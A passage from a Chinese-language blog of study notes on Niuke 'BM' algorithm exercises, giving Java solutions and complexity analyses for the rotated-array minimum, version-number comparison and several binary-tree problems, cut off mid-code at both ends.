class="type">int</span> left,<span class="type">int</span> mid,<span class="type">int</span> right)</span>&#123;</span><br><span class="line">        <span class="comment">// 创建临时数组，长度为此时两个子数组加起来的长度</span></span><br><span class="line">        <span class="type">int</span>[] arr =  <span class="keyword">new</span> <span class="title class_">int</span>[right-left+<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 临时数组的下标起点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 保存在原数组的起点下标值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> left;</span><br><span class="line">        <span class="comment">// 左子数组的起始指针</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> left;</span><br><span class="line">        <span class="comment">// 右子数组的起始指针</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> mid+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt;= mid &amp;&amp; r &lt;= right )&#123;</span><br><span class="line">            <span class="comment">// 当左子数组的当前元素小的时候，跳过，无逆序对</span></span><br><span class="line">            <span class="keyword">if</span>(array[l] &lt;= array[r])&#123;</span><br><span class="line">                <span class="comment">// 放入临时数组</span></span><br><span class="line">                arr[c] = array[l];</span><br><span class="line">                <span class="comment">// 临时数组下标+1</span></span><br><span class="line">                c++;</span><br><span class="line">                <span class="comment">// 左子数组指针右移</span></span><br><span class="line">                l++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; <span class="comment">// 否则，此时存在逆序对</span></span><br><span class="line">                <span class="comment">// 放入临时数组</span></span><br><span class="line">                arr[c] = array[r];</span><br><span class="line">                <span class="comment">// 逆序对的个数为    左子数组的终点- 当前左子数组的当前指针</span></span><br><span class="line">                count += mid+<span class="number">1</span>-l;</span><br><span class="line">                count %= <span class="number">1000000007</span>;</span><br><span class="line">                <span class="comment">// 临时数组+1</span></span><br><span class="line">                c++;</span><br><span class="line">                <span class="comment">// 右子数组的指针右移</span></span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 左子数组还有元素时，全部放入临时数组</span></span><br><span class="line">        <span class="keyword">while</span>(l &lt;= mid)</span><br><span class="line">            arr[c++] = array[l++];</span><br><span class="line">        <span class="comment">// 右子数组还有元素时，全部放入临时数组</span></span><br><span class="line">        <span class="keyword">while</span>(r &lt;= right)</span><br><span class="line">            arr[c++] = array[r++];</span><br><span class="line">        <span class="comment">// 将临时数组中的元素放入到原数组的指定位置</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:arr)&#123;</span><br><span class="line">            array[s++] = num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(NlogN)。归并排序的时间复杂度</li>
<li>空间复杂度：O(N)。临时数组的空间。</li>
</ul>
<h2 id="BM21-旋转数组的最小数字"><a href="#BM21-旋转数组的最小数字" class="headerlink" title="BM21 旋转数组的最小数字"></a><strong>BM21</strong> <strong>旋转数组的最小数字</strong></h2><blockquote>
<p>有一个长度为 n 的非降序数组，比如[1,2,3,4,5]，将它进行旋转，即把一个数组最开始的若干个元素搬到数组的末尾，变成一个旋转数组，比如变成了[3,4,5,1,2]，或者[4,5,1,2,3]这样的。请问，给定这样一个旋转数组，求数组中的最小值。</p>
<p>数据范围：1≤n≤10000，数组中任意元素的值: 0≤val≤10000</p>
<p>要求：空间复杂度：O(1) ，时间复杂度：O(logn)</p>
</blockquote>
<h3 id="思路：二分查找-2"><a href="#思路：二分查找-2" class="headerlink" title="思路：二分查找"></a>思路：二分查找</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minNumberInRotateArray</span><span class="params">(<span class="type">int</span> [] array)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> array.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//最小的数字在mid右边</span></span><br><span class="line">            <span class="keyword">if</span>(array[mid] &gt; array[right]) </span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//无法判断，一个一个试</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(array[mid] == array[right]) </span><br><span class="line">                right--;</span><br><span class="line">            <span class="comment">//最小数字要么是mid要么在mid左边</span></span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                right = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array[left];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM22-比较版本号"><a href="#BM22-比较版本号" class="headerlink" title="BM22 比较版本号"></a><strong>BM22</strong> <strong>比较版本号</strong></h2><blockquote>
<p>牛客项目发布项目版本时会有版本号，比如1.02.11，2.14.4等等 </p>
<p>现在给你2个版本号version1和version2，请你比较他们的大小</p>
<p>版本号是由修订号组成，修订号与修订号之间由一个”.”连接。1个修订号可能有多位数字组成，修订号可能包含前导0，且是合法的。例如，1.02.11，0.1，0.2都是合法的版本号</p>
<p>每个版本号至少包含1个修订号。 </p>
<p>修订号从左到右编号，下标从0开始，最左边的修订号下标为0，下一个修订号下标为1，以此类推。 </p>
<p>比较规则： </p>
<p>一. 比较版本号时，请按从左到右的顺序依次比较它们的修订号。比较修订号时，只需比较忽略任何前导零后的整数值。比如”0.1”和”0.01”的版本号是相等的 </p>
<p>二. 如果版本号没有指定某个下标处的修订号，则该修订号视为0。例如，”1.1”的版本号小于”1.1.1”。因为”1.1”的版本号相当于”1.1.0”，第3位修订号的下标为0，小于1 </p>
<p>三. version1 &gt; version2 返回1，如果 version1 &lt; version2 返回-1，不然返回0.</p>
</blockquote>
<h3 id="思路：双指针-2"><a href="#思路：双指针-2" class="headerlink" title="思路：双指针"></a>思路：双指针</h3><ul>
<li>step 1：利用两个指针表示字符串的下标，分别遍历两个字符串。</li>
<li>step 2：每次截取点之前的数字字符组成数字，即在遇到一个点之前，直接取数字，加在前面数字乘10的后面。（因为int会溢出，这里采用long记录数字）</li>
<li>step 3：然后比较两个数字大小，根据大小关系返回1或者-1，如果全部比较完都无法比较出大小关系，则返回0.</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span> <span class="params">(String version1, String version2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> version1.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n2</span> <span class="operator">=</span> version2.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//直到某个字符串结束</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; n1 || j &lt; n2)&#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">num1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//从下一个点前截取数字</span></span><br><span class="line">            <span class="keyword">while</span>(i &lt; n1 &amp;&amp; version1.charAt(i) != <span class="string">&#x27;.&#x27;</span>)&#123; </span><br><span class="line">                num1 = num1 * <span class="number">10</span> + (version1.charAt(i) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//跳过点</span></span><br><span class="line">            i++; </span><br><span class="line">            <span class="type">long</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//从下一个点前截取数字</span></span><br><span class="line">            <span class="keyword">while</span>(j &lt; n2 &amp;&amp; version2.charAt(j) != <span class="string">&#x27;.&#x27;</span>)&#123; </span><br><span class="line">                num2 = num2 * <span class="number">10</span> + (version2.charAt(j) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//跳过点</span></span><br><span class="line">            j++; </span><br><span class="line">            <span class="comment">//比较数字大小</span></span><br><span class="line">            <span class="keyword">if</span>(num1 &gt; num2) </span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(num1 &lt; num2)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//版本号相同</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(max(n,m))，其中m和n分别为两个字符串的长度，遍历两个字符串，复杂度选取较高值</li>
<li>空间复杂度：O(1)，常数级变量，无额外辅助空间</li>
</ul>
<h1 id="三、二叉树"><a href="#三、二叉树" class="headerlink" title="三、二叉树"></a>三、二叉树</h1><h2 id="BM23-二叉树的前序遍历"><a href="#BM23-二叉树的前序遍历" class="headerlink" title="BM23 二叉树的前序遍历"></a><strong>BM23</strong> <strong>二叉树的前序遍历</strong></h2><blockquote>
<p>给你二叉树的根节点 root ，返回它节点值的 前序 遍历。</p>
<p>数据范围：二叉树的节点数量满足 1≤n≤100 1≤<em>n</em>≤100 ，二叉树节点的值满足 1≤val≤100 1≤<em>v<strong>a</strong>l</em>≤100 ，树的各节点的值各不相同</p>
</blockquote>
<h3 id="思路：递归-2"><a href="#思路：递归-2" class="headerlink" title="思路：递归"></a>思路：递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        preorder(root, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; res)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(root.val);</span><br><span class="line">        preorder(root.left, res);</span><br><span class="line">        preorder(root.right, res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM24-二叉树的中序遍历"><a href="#BM24-二叉树的中序遍历" class="headerlink" title="BM24 二叉树的中序遍历"></a><strong>BM24</strong> <strong>二叉树的中序遍历</strong></h2><h2 id="BM25-二叉树的后序遍历"><a href="#BM25-二叉树的后序遍历" class="headerlink" title="BM25 二叉树的后序遍历"></a><strong>BM25</strong> <strong>二叉树的后序遍历</strong></h2><p>这几个题就不记录了，套板子就行～</p>
<h2 id="BM26-求二叉树的层序遍历"><a href="#BM26-求二叉树的层序遍历" class="headerlink" title="BM26 求二叉树的层序遍历"></a><strong>BM26</strong> <strong>求二叉树的层序遍历</strong></h2><h3 id="思路：BFS（广度优先搜索）"><a href="#思路：BFS（广度优先搜索）" class="headerlink" title="思路：BFS（广度优先搜索）"></a>思路：BFS（广度优先搜索）</h3><blockquote>
<p>DFS（深度优先搜索）和 BFS（广度优先搜索）就像孪生兄弟，提到一个总是想起另一个。然而在实际使用中，我们用 DFS 的时候远远多于 BFS。那么，是不是 BFS 就没有什么用呢？</p>
<p>如果我们使用 DFS&#x2F;BFS 只是为了遍历一棵树、一张图上的所有结点的话，那么 DFS 和 BFS 的能力没什么差别，我们当然更倾向于更方便写、空间复杂度更低的 DFS 遍历。不过，某些使用场景是 DFS 做不到的，只能使用 BFS 遍历。这就是本文要介绍的两个场景：「层序遍历」、「最短路径」</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TreeNode&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            List&lt;Integer&gt; level = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            <span class="type">int</span> <span class="variable">currentLevelSize</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= currentLevelSize; ++i) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                level.add(node.val);</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.offer(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.offer(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ret.add(level);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：每个点进队出队各一次，故渐进时间复杂度为 O(n)。</li>
<li>空间复杂度：队列中元素的个数不超过 n 个，故渐进空间复杂度为 O(n)。</li>
</ul>
<p>可以适当记一下这个模版～理解起来就比较好记了，<span style='color:orange'>核心是利用队列的思想。</span></p>
<h2 id="BM27-按之字形顺序打印二叉树"><a href="#BM27-按之字形顺序打印二叉树" class="headerlink" title="BM27 按之字形顺序打印二叉树"></a><strong>BM27</strong> <strong>按之字形顺序打印二叉树</strong></h2><blockquote>
<p>给定一个二叉树，返回该二叉树的之字形层序遍历，（第一层从左向右，下一层从右向左，一直这样交替） </p>
<p>数据范围：0≤n≤1500,树上每个节点的val满足 ∣val∣&lt;&#x3D;1500<br>要求：空间复杂度：O(n)，时间复杂度：O(n)</p>
</blockquote>
<h2 id="思路：BFS"><a href="#思路：BFS" class="headerlink" title="思路：BFS"></a>思路：BFS</h2><p>和前面层序遍历一样，只不过需要加一个flag来判断是否当前层该逆序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt; &gt; Print(TreeNode pRoot) &#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">head</span> <span class="operator">=</span> pRoot;</span><br><span class="line">        ArrayList&lt;ArrayList&lt;Integer&gt; &gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;ArrayList&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>)</span><br><span class="line">            <span class="comment">//如果是空，则直接返回空list</span></span><br><span class="line">            <span class="keyword">return</span> res; </span><br><span class="line">        <span class="comment">//队列存储，进行层次遍历</span></span><br><span class="line">        Queue&lt;TreeNode&gt; temp = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TreeNode&gt;(); </span><br><span class="line">        temp.offer(head);</span><br><span class="line">        TreeNode p;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span>(!temp.isEmpty())&#123;</span><br><span class="line">            <span class="comment">//记录二叉树的某一行</span></span><br><span class="line">            ArrayList&lt;Integer&gt; row = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();  </span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> temp.size();</span><br><span class="line">            <span class="comment">//奇数行反转，偶数行不反转</span></span><br><span class="line">            flag = !flag; </span><br><span class="line">            <span class="comment">//因先进入的是根节点，故每层节点多少，队列大小就是多少</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">                p = temp.poll();</span><br><span class="line">                row.add(p.val);</span><br><span class="line">                <span class="comment">//若是左右孩子存在，则存入左右孩子作为下一个层次</span></span><br><span class="line">                <span class="keyword">if</span>(p.left != <span class="literal">null</span>)</span><br><span class="line">                    temp.offer(p.left);</span><br><span class="line">                <span class="keyword">if</span>(p.right != <span class="literal">null</span>)</span><br><span class="line">                    temp.offer(p.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//奇数行反转，偶数行不反转</span></span><br><span class="line">            <span class="keyword">if</span>(flag)  </span><br><span class="line">                Collections.reverse(row);</span><br><span class="line">            res.add(row);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(n)，每个节点访问一次，因为reverse的时间复杂度为O(n)，按每层元素reverse也相当于O(n)</li>
<li>空间复杂度：O(n)，队列的空间最长为O(n)</li>
</ul>
<h2 id="BM28-二叉树的最大深度"><a href="#BM28-二叉树的最大深度" class="headerlink" title="BM28 二叉树的最大深度"></a><strong>BM28</strong> <strong>二叉树的最大深度</strong></h2><h3 id="思路：递归-3"><a href="#思路：递归-3" class="headerlink" title="思路：递归"></a>思路：递归</h3><p>思路很简单，直接递归就好～</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span> <span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="comment">//空节点没有深度</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//返回子树深度+1</span></span><br><span class="line">        <span class="keyword">return</span> Math.max(maxDepth(root.left), maxDepth(root.right)) + <span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="BM29-二叉树中和为某一值的路径-一"><a href="#BM29-二叉树中和为某一值的路径-一" class="headerlink" title="BM29 二叉树中和为某一值的路径(一)"></a><strong>BM29</strong> <strong>二叉树中和为某一值的路径(一)</strong></h2><blockquote>
<p>给定一个二叉树root和一个值 sum ，判断是否有从根节点到叶子节点的节点值之和等于 sum 的路径。</p>
<p>1.该题路径定义为从树的根结点开始往下一直到叶子结点所经过的结点</p>
<p>2.叶子节点是指没有子节点的节点</p>
<p>3.路径只能从父节点到子节点，不能从子节点到父节点</p>
<p>4.总节点数目为n</p>
</blockquote>
<h3 id="思路：递归-4"><a href="#思路：递归-4" class="headerlink" title="思路：递归"></a>思路：递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPathSum</span> <span class="params">(TreeNode root, <span class="type">int</span> sum)</span> &#123;</span><br><span class="line">        <span class="comment">//空节点找不到路径</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//叶子节点，且路径和为sum</span></span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span> &amp;&amp; sum - root.val == <span class="number">0</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//递归进入子节点</span></span><br><span class="line">        <span class="keyword">return</span> hasPathSum(root.left, sum - root.val) || hasPathSum(root.right, sum - root.val); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM30-二叉搜索树与双向链表"><a href="#BM30-二叉搜索树与双向链表" class="headerlink" title="BM30 二叉搜索树与双向链表"></a><strong>BM30</strong> <strong>二叉搜索树与双向链表</strong></h2><blockquote>
<p>输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。如下图所示</p>
</blockquote>
<p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/E1F1270919D292C9F48F51975FD07CE2.png"></p>
<h3 id="思路：利用二叉搜索树的特征进行递归"><a href="#思路：利用二叉搜索树的特征进行递归" class="headerlink" title="思路：利用二叉搜索树的特征进行递归"></a>思路：利用二叉搜索树的特征进行递归</h3><p>核心：二叉搜索树最左端的元素一定最小，最右端的元素一定最大，符合“左中右”的特性，因此二叉搜索树的中序遍历就是一个递增序列，我们只要对它中序遍历就可以组装称为递增双向链表。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//返回的第一个指针，即为最小值，先定为null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">TreeNode</span> <span class="variable">head</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="comment">//中序遍历当前值的上一位，初值为最小值，先定为null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;   </span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">Convert</span><span class="params">(TreeNode pRootOfTree)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(pRootOfTree == <span class="literal">null</span>)</span><br><span class="line">            <span class="comment">//中序递归，叶子为空则返回</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;     </span><br><span class="line">        <span class="comment">//首先递归到最左最小值  </span></span><br><span class="line">        Convert(pRootOfTree.left); </span><br><span class="line">        <span class="comment">//找到最小值，初始化head与pre</span></span><br><span class="line">        <span class="keyword">if</span>(pre == <span class="literal">null</span>)&#123;       </span><br><span class="line">            head = pRootOfTree;</span><br><span class="line">            pre = pRootOfTree;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//当前节点与上一节点建立连接，将pre设置为当前值</span></span><br><span class="line">        <span class="keyword">else</span>&#123;       </span><br><span class="line">            pre.right = pRootOfTree;</span><br><span class="line">            pRootOfTree.left = pre;</span><br><span class="line">            pre = pRootOfTree;</span><br><span class="line">        &#125;</span><br><span class="line">        Convert(pRootOfTree.right);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(n)，其中n<em>n</em>为二叉树节点数，中序遍历所有节点</li>
<li>空间复杂度：O(n)，递归栈所需要的最大空间</li>
</ul>
<h2 id="BM31-对称的二叉树"><a href="#BM31-对称的二叉树" class="headerlink" title="BM31 对称的二叉树"></a><strong>BM31</strong> <strong>对称的二叉树</strong></h2><blockquote>
<p>给定一棵二叉树，判断其是否是自身的镜像（即：是否对称）<br>例如：                 下面这棵二叉树是对称的</p>
</blockquote>
<p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/A22A794C036C06431E632F9D5E2E298F.png"></p>
<h3 id="思路：递归-5"><a href="#思路：递归-5" class="headerlink" title="思路：递归"></a>思路：递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isSymmetrical</span><span class="params">(TreeNode pRoot)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(pRoot == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> compare(pRoot.left,pRoot.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">compare</span><span class="params">(TreeNode left, TreeNode right)</span>&#123;</span><br><span class="line">      <span class="comment">//可以两个都为空</span></span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>)   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       <span class="comment">//只有一个为空或者节点值不同，必定不对称</span></span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> || right == <span class="literal">null</span> || left.val != right.val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="comment">//每层对应的节点进入递归比较</span></span><br><span class="line">        <span class="keyword">return</span> compare(left.left,right.right)&amp;&amp;compare(left.right,right.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(n)，其中n<em>n</em>为二叉树的节点数，相当于遍历整个二叉树两次</li>
<li>空间复杂度：O(n)，最坏情况二叉树退化为链表，递归栈深度为n<em>n</em></li>
</ul>
<h2 id="BM32-合并二叉树"><a href="#BM32-合并二叉树" class="headerlink" title="BM32 合并二叉树"></a><strong>BM32</strong> <strong>合并二叉树</strong></h2><blockquote>
<p>已知两颗二叉树，将它们合并成一颗二叉树。合并规则是：都存在的结点，就将结点值加起来，否则空的位置就由另一个树的结点来代替。例如：</p>
</blockquote>
<h3 id="思路：递归-6"><a href="#思路：递归-6" class="headerlink" title="思路：递归"></a>思路：递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mergeTrees</span> <span class="params">(TreeNode t1, TreeNode t2)</span> &#123;</span><br><span class="line">        <span class="comment">//若只有一个节点返回另一个，两个都为null自然返回null</span></span><br><span class="line">        <span class="keyword">if</span> (t1 == <span class="literal">null</span>) </span><br><span class="line">            <span class="keyword">return</span> t2;</span><br><span class="line">        <span class="keyword">if</span> (t2 == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> t1;</span><br><span class="line">        <span class="comment">//根左右的方式递归</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">head</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(t1.val + t2.val);</span><br><span class="line">        head.left = mergeTrees(t1.left, t2.left);</span><br><span class="line">        head.right = mergeTrees(t1.right, t2.right);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="BM33-二叉树的镜像"><a href="#BM33-二叉树的镜像" class="headerlink" title="BM33 二叉树的镜像"></a><strong>BM33</strong> <strong>二叉树的镜像</strong></h2><blockquote>
<p>操作给定的二叉树，将其变换为源二叉树的镜像。 </p>
<p>数据范围：二叉树的节点数 0≤n≤1000， 二叉树每个节点的值 0≤val≤1000</p>
<p>要求： 空间复杂度 O(n)。本题也有原地操作，即空间复杂度 O(1)的解法，时间复杂度 O(n)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">Mirror</span> <span class="params">(TreeNode pRoot)</span> &#123;</span><br><span class="line">        <span class="comment">//空树返回</span></span><br><span class="line">        <span class="keyword">if</span>(pRoot == <span class="literal">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//先递归子树</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> Mirror(pRoot.left);  </span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> 